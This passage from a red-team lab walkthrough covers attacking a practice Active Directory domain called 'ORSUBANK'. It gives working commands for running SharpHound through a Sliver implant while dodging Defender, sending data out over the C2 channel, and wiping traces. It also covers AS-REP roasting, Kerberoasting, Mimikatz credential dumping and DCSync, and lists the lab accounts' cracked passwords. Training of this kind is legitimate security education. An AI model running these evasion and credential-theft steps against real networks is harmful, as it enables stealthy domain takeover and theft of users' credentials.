# Doesn't touch every workstation
# Gets most important data (users, groups, ACLs)

# OR for session hunting specifically:
sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c Session

# -c Session finds who's logged in where
# Useful for credential hunting
```

### Step 6.4.3: Understanding Collection Methods for Stealth

```
SHARPHOUND COLLECTION METHODS - RANKED BY STEALTH:
────────────────────────────────────────────────────────────────

MOST STEALTHY (Recommended):
─────────────────────────────
-c DCOnly     → Only queries DC, no touching workstations
-c Group      → Only group memberships
-c Trusts     → Domain trust relationships

MEDIUM NOISE:
─────────────
-c ObjectProps → Object properties from DC
-c ACL        → Access control lists from DC
-c Default    → Basic collection (Group + LocalAdmin + Session)

NOISY (Avoid if possible):
──────────────────────────
-c Session    → Touches every computer to check sessions
-c LocalAdmin → Queries every computer for local admins
-c RDP        → Checks RDP access on all computers
-c All        → Everything! Very noisy!

RECOMMENDATION FOR ORSUBANK:
────────────────────────────
1. First run: -c DCOnly (get users, groups, ACLs)
2. If needed: -c Session (find admin sessions)
3. Only if required: -c All (full enumeration)
```

---

## Part 6.5: The Output File Problem

```
WHERE DOES SHARPHOUND OUTPUT GO?
────────────────────────────────────────────────────────────────

When you run execute-assembly, SharpHound still writes output to disk!

It creates: C:\Users\vamsi.krishna\20241229103000_BloodHound.zip

PROBLEM:
─────────
The ZIP file IS written to disk (in current working directory)
Defender might scan it when accessed

SOLUTION:
─────────
1. Write to a less monitored location
2. Download immediately via Sliver
3. Delete the file right after
```

### Step 6.5.1: Output to Safer Location

```bash
# Specify output directory with --outputdirectory

sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly --outputdirectory C:\\Windows\\Temp

# Output goes to: C:\Windows\Temp\20241229103000_BloodHound.zip
# Windows\Temp is less monitored than user folders
```

### Step 6.5.2: Alternative - Use Random Filename

```bash
# Use --outputprefix to randomize filename

sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly --outputprefix data --outputdirectory C:\\Windows\\Temp

# Creates: C:\Windows\Temp\data_20241229103000.zip
# Less suspicious than "BloodHound" in the filename
```

---

## Part 6.6: Stealthy Data Exfiltration

```
EXFILTRATION WITH DEFENDER ENABLED:
────────────────────────────────────────────────────────────────

RISKY METHODS:
──────────────
❌ SMB copy to your machine (monitored)
❌ FTP/HTTP to external server (blocked/logged)
❌ Email attachment (DLP catches it)

SLIVER C2 EXFILTRATION (BEST):
──────────────────────────────
✅ Use Sliver's built-in download command
✅ Data goes over your existing C2 channel (HTTPS port 443)
✅ Already encrypted
✅ Looks like normal HTTPS traffic
✅ No new connections created
```

### Step 6.6.1: List Files First

```bash
# Find the output file

sliver (IMPLANT_NAME) > ls C:\\Windows\\Temp

# Look for your ZIP file:
# data_20241229103000.zip

# Or search for it:
sliver (IMPLANT_NAME) > shell

C:\> dir C:\Windows\Temp\*.zip /s /b
# C:\Windows\Temp\data_20241229103000.zip

C:\> exit
```

### Step 6.6.2: Download via C2 Channel

```bash
# Download the file through Sliver's encrypted channel

sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\data_20241229103000.zip /tmp/bloodhound_data.zip

# Output:
# [*] Downloaded 'data_20241229103000.zip' (248KB) to '/tmp/bloodhound_data.zip'

# The data traverses:
# WS01 → HTTPS (port 443) → Kali
# Encrypted, looks like normal web traffic!
```

### Step 6.6.3: Clean Up (Critical for Stealth!)

```bash
# DELETE THE FILE FROM TARGET IMMEDIATELY!

sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\data_20241229103000.zip

# Verify it's gone:
sliver (IMPLANT_NAME) > ls C:\\Windows\\Temp\\data*.zip
# (should be empty)

# Also clean SharpHound cache if it exists:
sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\*.bin
```

---

## Part 6.7: Alternative - Using BOFs (Beacon Object Files)

```
WHAT ARE BOFs?
────────────────────────────────────────────────────────────────

BOFs = Beacon Object Files (from Cobalt Strike)
Sliver supports Cobalt Strike BOFs!

BOFs are:
- Compiled C code that runs in-process
- Even stealthier than execute-assembly
- No .NET CLR loaded
- Harder for EDR to detect

SHARPCOLLECTION BOF:
────────────────────
There's a BOF version of BloodHound collection!
https://github.com/outflanknl/C2-Tool-Collection
```

### Using BOFs in Sliver

```bash
# Load BOF extension (if available)

sliver (IMPLANT_NAME) > armory install sharp-collection

# Run the BOF
sliver (IMPLANT_NAME) > sharp-collection -c DCOnly

# BOF runs entirely in-memory
# No .NET assembly loaded
# Stealthier than execute-assembly
```

---

## Part 6.8: ADRecon Alternative (Built-in PowerShell Evasion)

```
IF SHARPHOUND IS GETTING CAUGHT:
────────────────────────────────────────────────────────────────

Sometimes even execute-assembly gets flagged.
Alternative: Use PowerShell with AMSI bypass!

Since our loader already patched AMSI, PowerShell is "clean"
```

### Native PowerShell AD Enumeration (No Tools!)

```bash
# From Sliver, spawn a shell

sliver (IMPLANT_NAME) > shell

# AMSI is already bypassed from our loader
# These commands work without triggering Defender:

# Find Domain Admins
C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Select Name"

# Find Kerberoastable accounts
C:\> powershell -c "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"

# Find AS-REP Roastable accounts
C:\> powershell -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name"

# Find computers
C:\> powershell -c "Get-ADComputer -Filter * | Select Name,DNSHostName"

# Find nested groups
C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Select Name,objectClass"

C:\> exit
```

### Export to CSV for Analysis

```bash
sliver (IMPLANT_NAME) > shell

# Export users to CSV
C:\> powershell -c "Get-ADUser -Filter * -Properties * | Export-CSV C:\Windows\Temp\users.csv"

# Export groups
C:\> powershell -c "Get-ADGroup -Filter * | Export-CSV C:\Windows\Temp\groups.csv"

# Export group members
C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Export-CSV C:\Windows\Temp\da_members.csv"

C:\> exit

# Download
sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\users.csv /tmp/
sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\groups.csv /tmp/
sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\da_members.csv /tmp/

# Clean up
sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\users.csv
sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\groups.csv
sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\da_members.csv
```

---

## Part 6.9: Setting Up BloodHound on Kali

### Step 6.9.1: Install BloodHound

```bash
# On Kali (192.168.100.100)

# Install BloodHound and Neo4j
sudo apt update
sudo apt install bloodhound neo4j -y

# OR use the new BloodHound Community Edition (Docker)
# This is the recommended approach now!
curl -L https://github.com/SpecterOps/BloodHound/releases/latest/download/docker-compose.yml | docker compose -f - up -d
```

### Step 6.9.2: Start Neo4j (Legacy BloodHound)

```bash
# Start Neo4j database
sudo neo4j start

# Wait 30 seconds for it to start
sleep 30

# Set password (first time only)
# Open browser: http://localhost:7474
# Login: neo4j / neo4j
# Change password to: bloodhound
```

### Step 6.9.3: Start BloodHound

```bash
# Start BloodHound GUI
bloodhound &

# Login with:
# Bolt URL: bolt://localhost:7687
# Username: neo4j
# Password: bloodhound
```

---

## Part 6.10: Importing Data Into BloodHound

### Step 6.10.1: Import the ZIP File

```
In BloodHound GUI:

1. Click the "Upload Data" button (folder icon, top right)
2. Navigate to /tmp/bloodhound_data.zip
3. Select and click "Open"
4. Wait for import to complete

SUCCESS MESSAGE:
────────────────
You should see:
- Computers: 3 (DC01, WS01, WS02)
- Users: ~15
- Groups: ~25
- Import complete!
```

### Step 6.10.2: Verify Import Success

```
Click "Database Info" (cylinder icon)

EXPECTED FOR ORSUBANK:
──────────────────────
Users: 10-15
Computers: 3
Groups: 25+
Sessions: varies (depends on who's logged in)
ACLs: 100+

If these numbers look right, you're good!
```

---

## Part 6.11: Operational Security Checklist

```
BEFORE EXFILTRATION - OPSEC CHECKLIST:
────────────────────────────────────────────────────────────────

✅ AMSI bypass is working (from initial access loader)
✅ ETW bypass is working (from initial access loader)
✅ Using execute-assembly (not uploading files)
✅ Using stealth collection (-c DCOnly first)
✅ Output to Windows\Temp (less monitored)
✅ Random output prefix (not "BloodHound")
✅ Download via C2 channel (not SMB/HTTP)
✅ Clean up files immediately after download
✅ No persistent files left on target

AFTER ENUMERATION:
──────────────────
✅ Delete any temporary files created
✅ Clear your command history if you used shell
✅ Check Defender events (if you have access)
✅ Verify no alerts triggered
```

---

## Part 6.12: Interview Gold - Red Team Methodology

### Q: How do you run SharpHound without getting detected?

```
ANSWER FOR INTERVIEWS:
────────────────────────────────────────────────────────────────

"In a real engagement, I follow these steps:

1. INITIAL ACCESS WITH EVASION
   - Use encrypted shellcode loader with AMSI/ETW bypass
   - Get C2 session without triggering Defender

2. IN-MEMORY EXECUTION
   - Use C2's execute-assembly capability (Sliver, Cobalt Strike)
   - SharpHound never touches disk
   - Runs from memory only

3. STEALTH COLLECTION
   - Start with -c DCOnly (minimal noise)
   - Only expand to -c All if needed
   - Avoid touching every workstation

4. SECURE EXFILTRATION
   - Download via C2 channel (already encrypted)
   - No separate exfil connections
   - Blends with existing C2 traffic

5. CLEANUP
   - Delete output files immediately
   - Clear cache files
   - Verify no artifacts remain

This approach maintains OPSEC while still getting the AD data
needed for attack path analysis."
```

### Q: What if execute-assembly gets detected?

```
ANSWER:
────────────────────────────────────────────────────────────────

"I have several fallback options:

1. Use BOFs (Beacon Object Files)
   - Even stealthier than .NET assemblies
   - No CLR loading
   - Runs directly in beacon process

2. Native PowerShell enumeration
   - With AMSI bypassed, PowerShell is clean
   - Use Get-ADUser, Get-ADGroup directly
   - Export to CSV for offline analysis

3. LDAP queries from Kali
   - If I have creds, query DC directly from my box
   - Tools: ldapsearch, ADExplorer, windapsearch
   - No execution on target at all

4. Manual enumeration
   - Query one thing at a time
   - Less likely to trigger behavior-based detection
   - Slower but stealthier"
```

---

# PART 7: FINDING ATTACK PATHS IN ORSUBANK

---

## Part 7.1: Finding Domain Admins

### Step 7.1.1: Run Built-in Query

```
In BloodHound:
1. Click "Analysis" tab (hamburger menu)
2. Click "Find all Domain Admins"

RESULT:
──────
You should see:
- ammulu.orsu (IT Manager)
- svc_backup (Service Account)
- Server_Admins (Group) ← Nested!
- Administrator
```

### Step 7.1.2: Understand What You See

```
ORSUBANK DOMAIN ADMINS:
────────────────────────────────────────────────────────────────

┌─────────────────────────┐
│     DOMAIN ADMINS       │
├─────────────────────────┤
│  ┌─────────────────┐    │
│  │ ammulu.orsu     │    │ ← Direct member (IT Manager)
│  └─────────────────┘    │
│  ┌─────────────────┐    │
│  │ svc_backup      │    │ ← Direct member (Service Account!)
│  └─────────────────┘    │
│  ┌─────────────────┐    │
│  │ Server_Admins   │    │ ← GROUP is member (nested!)
│  └─────────────────┘    │
│  ┌─────────────────┐    │
│  │ Administrator   │    │ ← Built-in admin
│  └─────────────────┘    │
└─────────────────────────┘

svc_backup is a SERVICE ACCOUNT with Domain Admin!
This is a HUGE finding!
```

---

## Part 7.2: The Nested Group Attack Path

### Step 7.2.1: Find the Path

```
In BloodHound:
1. Search for "harsha.vardhan" in the search bar
2. Right-click on the node
3. Select "Shortest Path to Domain Admin"

OR:

1. Click "Analysis"
2. Click "Shortest Paths to Domain Admins from Domain Users"
```

### Step 7.2.2: What You'll See

```
BLOODHOUND WILL SHOW THIS PATH:
────────────────────────────────────────────────────────────────

                    ┌─────────────┐
                    │   Domain    │
                    │   Admins    │
                    └──────▲──────┘
                           │
                    MemberOf
                           │
                    ┌──────┴──────┐
                    │   Server    │
                    │   _Admins   │
                    └──────▲──────┘
                           │
                    MemberOf
                           │
                    ┌──────┴──────┐
                    │  IT_Support │
                    └──────▲──────┘
                           │
                    MemberOf
                           │
                    ┌──────┴──────┐
                    │ HelpDesk    │
                    │   _Team     │
                    └──────▲──────┘
                           │
                    MemberOf
                           │
                    ┌──────┴──────┐
                    │   harsha.   │
                    │   vardhan   │
                    └─────────────┘


ATTACK:
───────
1. AS-REP Roast harsha.vardhan
2. Crack: Customer2024!
3. Login as harsha.vardhan
4. You ARE Domain Admin (through nesting)!
```

---

## Part 7.3: Kerberoastable Accounts

### Step 7.3.1: Find Kerberoastable Accounts

```
In BloodHound:
1. Click "Analysis"
2. Click "List All Kerberoastable Accounts"

RESULT:
──────
- sqlservice      (MSSQLSvc/DC01:1433)
- httpservice     (HTTP/web.orsubank.local)
- iisservice      (HTTP/app.orsubank.local)
- backupservice   (MSSQLSvc/DC01:1434)
- svc_backup      (backup/dc01.orsubank.local) ← DOMAIN ADMIN!
```

### Step 7.3.2: Identify the High-Value Target

```
CRITICAL FINDING:
────────────────────────────────────────────────────────────────

svc_backup is BOTH:
1. Kerberoastable (has an SPN)
2. A Domain Admin!

If you crack svc_backup's password, you get Domain Admin!

Password: Backup@2024!
Hashcat mode: 13100
```

---

## Part 7.4: AS-REP Roastable Accounts

### Step 7.4.1: Find AS-REP Roastable Accounts

```
In BloodHound:
1. Click "Analysis"
2. Click "Find AS-REP Roastable Users (DoesNotReqPreAuth)"

RESULT:
──────
- pranavi
- harsha.vardhan ← Also leads to DA through groups!
- kiran.kumar
```

### Step 7.4.2: The Best Target

```
BEST TARGET: harsha.vardhan
────────────────────────────────────────────────────────────────

Why?
- Can be AS-REP roasted (no pre-auth required)
- Password: Customer2024! (easy to crack)
- Is effectively a Domain Admin through nested groups!

Attack:
1. [Kali] GetNPUsers.py orsubank.local/ -usersfile users.txt -no-pass
2. Get harsha.vardhan's hash
3. hashcat -m 18200 hash.txt rockyou.txt
4. Crack: Customer2024!
5. Login as harsha.vardhan
6. You ARE Domain Admin!
```

---

## Part 7.5: Session Hunting

### Step 7.5.1: Find Where Admins Are Logged In

```
In BloodHound:
1. Click "Analysis"
2. Click "Find Workstations where Domain Admins are logged in"

RESULT:
──────
WS01 ← lakshmi.devi (DA session!)
WS02 ← (check for sessions)
```

### Step 7.5.2: The Attack

```
SESSION HUNTING ATTACK:
────────────────────────────────────────────────────────────────

SCENARIO:
- You have shell on WS01 as vamsi.krishna
- lakshmi.devi (DA) logs into WS01 sometimes

ATTACK:
1. Wait for lakshmi.devi to log in
2. Run Mimikatz: sekurlsa::logonpasswords
3. Get her NTLM hash or credentials
4. Pass-the-hash or login as lakshmi.devi
5. You ARE Domain Admin!

This is why checking sessions is important!
```

---

## Part 7.6: DCSync Attack Path

### Step 7.6.1: Find DCSync Rights

```
In BloodHound:
1. Click "Analysis"
2. Click "Find Principals with DCSync Rights"

RESULT:
──────
- Domain Controllers (expected)
- Domain Admins (expected)
- WS01$ ← MISCONFIGURATION!
```

### Step 7.6.2: The Attack

```
DCSYNC FROM WS01:
────────────────────────────────────────────────────────────────

WS01$ (the computer account) has DCSync rights!

ATTACK:
1. Get shell on WS01
2. Escalate to SYSTEM
3. Run Mimikatz (as SYSTEM, using WS01$'s privileges):
   
   mimikatz # lsadump::dcsync /domain:orsubank.local /user:Administrator

4. Get Administrator's NTLM hash
5. Pass-the-hash as Administrator
6. You ARE Domain Admin!


FROM SLIVER:
────────────
sliver > getsystem
sliver > execute-assembly /opt/tools/mimikatz.exe "lsadump::dcsync /domain:orsubank.local /user:Administrator"
```

---

# PART 8: ADVANCED QUERIES

---

## Part 8.1: Custom Cypher Queries

```
BLOODHOUND USES CYPHER QUERY LANGUAGE:
────────────────────────────────────────────────────────────────

FIND ALL USERS:
───────────────
MATCH (n:User) RETURN n

FIND ALL DOMAIN ADMINS:
───────────────────────
MATCH (n:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"}) 
OPTIONAL MATCH (n)<-[r:MemberOf*1..]-(m) 
RETURN n,m

FIND KERBEROASTABLE DOMAIN ADMINS:
──────────────────────────────────
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"})
RETURN u.name

# This will return: svc_backup (the DA service account!)

FIND AS-REP ROASTABLE USERS WITH PATH TO DA:
────────────────────────────────────────────
MATCH (u:User {dontreqpreauth:true})
MATCH p=shortestPath((u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"}))
RETURN p

# This will show: harsha.vardhan → ... → Domain Admins
```

### How to Run Custom Queries

```
In BloodHound:
1. Click "Raw Query" (bottom of Analysis tab)
2. Paste your Cypher query
3. Press Enter
```

---

## Part 8.2: Finding Shortest Paths

```
SHORTEST PATH FROM OWNED USER TO DA:
────────────────────────────────────────────────────────────────

1. Mark vamsi.krishna as "Owned":
   - Search for vamsi.krishna
   - Right-click → Mark User as Owned

2. Run Query:
   - Analysis → "Shortest Paths to Domain Admins from Owned Principals"

3. See the path:
   - vamsi.krishna → [some path] → Domain Admins

Or if there's no direct path:
   - You may need to compromise another user first
   - BloodHound helps you plan multi-step attacks
```

---

## Part 8.3: Finding All Paths to DA

```
ALL ATTACK PATHS IN ORSUBANK:
────────────────────────────────────────────────────────────────

PATH 1: AS-REP Roast harsha.vardhan
────────────────────────────────────
harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → DA

PATH 2: Kerberoast svc_backup
─────────────────────────────
svc_backup (has SPN) → Domain Admins (direct member)

PATH 3: DCSync from WS01
────────────────────────
WS01$ → Has DCSync rights → Get all hashes → DA

PATH 4: Session Hunting
───────────────────────
WS01 → lakshmi.devi session → Credential theft → lakshmi is DA

PATH 5: Kerberoast any service + escalate
─────────────────────────────────────────
sqlservice/httpservice → get password → look for reused creds


BloodHound visualizes ALL of these!
```

---

# PART 9: INTERVIEW QUESTIONS & REFERENCE

---

## Part 9.1: Interview Questions

### BloodHound & AD Enumeration Questions

**Q: What is BloodHound and why is it used?**
A: BloodHound is an AD attack path visualization tool. It collects AD data, stores it in a graph database (Neo4j), and shows visual attack paths from compromised users to high-value targets like Domain Admins.

**Q: What is SharpHound?**
A: SharpHound is the data collection component of BloodHound. It's a C# executable that queries AD via LDAP to gather users, groups, sessions, ACLs, and more. It outputs JSON files in a ZIP archive.

**Q: What collection methods does SharpHound support?**
A: Main methods include:
- Default: Common data
- All: Everything (recommended for first run)
- Session: Active login sessions
- ACL: Access control lists
- LoggedOn: Who's logged in where

**Q: What is a nested group attack?**
A: When a user is in GroupA, which is in GroupB, which is in Domain Admins, the user is effectively a Domain Admin through nesting. BloodHound reveals these hidden paths.

**Q: What database does BloodHound use?**
A: Neo4j, a graph database. It stores nodes (users, computers, groups) and edges (relationships like MemberOf, HasSession, etc.).

**Q: What is the Cypher query to find all Domain Admins?**
A: `MATCH (n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) OPTIONAL MATCH (n)<-[r:MemberOf*1..]-(m) RETURN n,m`

**Q: What are common BloodHound edge types?**
A: 
- MemberOf: Group membership
- HasSession: User logged into computer
- AdminTo: Admin rights on computer
- GenericAll/GenericWrite: Dangerous ACL permissions
- DCSync: Replication rights
- CanRDP: Can remote desktop

**Q: How do you find Kerberoastable users in BloodHound?**
A: Click Analysis → "List All Kerberoastable Accounts" or query: `MATCH (u:User {hasspn:true}) RETURN u`

**Q: How do you find AS-REP Roastable users?**
A: Click Analysis → "Find AS-REP Roastable Users" or query: `MATCH (u:User {dontreqpreauth:true}) RETURN u`

**Q: What is session hunting?**
A: Finding computers where privileged users (like DAs) have active sessions. If you compromise that computer, you might steal their credentials from memory.

---

### ORSUBANK Specific Questions

**Q: Who are the Domain Admins in ORSUBANK?**
A: ammulu.orsu, svc_backup, Administrator, and harsha.vardhan (through nested groups).

**Q: Which ORSUBANK users are AS-REP Roastable?**
A: pranavi, harsha.vardhan, kiran.kumar

**Q: Which ORSUBANK accounts are Kerberoastable?**
A: sqlservice, httpservice, iisservice, backupservice, svc_backup

**Q: What's special about svc_backup?**
A: It's both Kerberoastable (has an SPN) AND a Domain Admin. Cracking it gives you DA!

**Q: What's the nested group path to DA in ORSUBANK?**
A: harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins

**Q: What special rights does WS01$ have?**
A: DCSync rights - the WS01 computer account can replicate the AD database, allowing anyone with SYSTEM on WS01 to get all domain password hashes.

---

## Part 9.2: Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| BloodHound won't connect to Neo4j | Neo4j not running | Run `sudo neo4j start` |
| SharpHound error: "Access denied" | Need domain user privileges | Run as domain user (vamsi.krishna) |
| No sessions found | SharpHound run during off-hours | Run again when users are logged in |
| Import fails | Corrupt ZIP | Re-run SharpHound |
| "No path found" | User can't reach DA | Try different collection, check ACLs |
| Neo4j password rejected | Wrong password | Reset via http://localhost:7474 |
| BloodHound shows empty graph | Data not imported | Click Upload and import ZIP |

---

## Part 9.3: What's Next

```
NEXT WALKTHROUGHS:
────────────────────────────────────────────────────────────────

Now that you've enumerated ORSUBANK with BloodHound, proceed to:

02_kerberoasting.md
───────────────────
Attack the service accounts you found:
- sqlservice (MYpassword123#)
- httpservice (Summer2024!)
- svc_backup (Backup@2024!) ← The DA one!

03_asrep_roasting.md
────────────────────
Attack users without pre-auth:
- harsha.vardhan (Customer2024!) ← Leads to DA!
- pranavi (Branch123!)
- kiran.kumar (Finance1!)

04_credential_dumping.md
────────────────────────
Dump credentials from WS01:
- Mimikatz sekurlsa::logonpasswords
- Catch lakshmi.devi's session

05_lateral_movement.md
──────────────────────
Move from WS01 to DC01:
- Pass-the-hash
- PSExec
- WinRM

06_domain_dominance.md
──────────────────────
Own the entire domain:
- DCSync
- Golden Ticket
- Persistence
```

---

*END OF DOCUMENT*

*You now know how to enumerate ORSUBANK Active Directory using BloodHound!*

*Key findings:*
- *ammulu.orsu and svc_backup are direct Domain Admins*
- *harsha.vardhan is DA through nested groups*
- *5 Kerberoastable accounts (svc_backup is DA!)*
- *3 AS-REP Roastable accounts*
- *WS01$ has DCSync rights*

*Use this knowledge ethically and legally!*
